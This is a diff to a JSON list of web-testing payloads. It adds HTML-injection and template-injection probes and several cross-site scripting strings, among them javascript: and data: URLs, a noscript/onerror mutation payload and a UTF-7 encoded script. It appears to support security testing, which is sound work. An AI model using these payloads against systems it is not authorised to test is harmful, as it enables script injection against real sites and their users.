@@ -1,5 +1,30 @@
 [
   {
+    "type": "check",
+    "items": [
+      {
+        "key": "s",
+        "value": "\"><s>zxc<!--<script>%0d%0a\\r\\n\\"
+      },
+      {
+        "key": "plaintext",
+        "value": "\"><plaintext>zxc<!--<script>%0d%0a\\r\\n\\"
+      },
+      {
+        "key": "{{8*8}}",
+        "value": "{{8*8}}"
+      },
+      {
+        "key": "<%=8*8%>",
+        "value": "<%=8*8%>"
+      },
+      {
+        "key": "{title: {toString: null}",
+        "value": "{\"title\": {\"toString\": null}}"
+      }
+    ]
+  },
+  {
     "type": "XSS",
     "items": [
       {
@@ -11,12 +36,24 @@
         "value": "\"><script>alert(document.domain)</scirpt>"
       },
       {
-        "key": "url",
+        "key": "javascript:",
         "value": "javascript:http://example.com/%0aalert%281%29"
+      },
+      {
+        "key": "data:",
+        "value": "data:text/html,<script>alert(0)</script>"
       },
       {
         "key": "<!--",
         "value": "<!-- hoge=\"--><img src=x onerror=alert(1)\" -->"
+      },
+      {
+        "key": "google xss",
+        "value": "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
+      },
+      {
+        "key": "utf-7",
+        "value": "+ADw-script+AD4- alert(+ACI-xss+ACI-) +ADw-/script+AD4-"
       }
     ]
   },
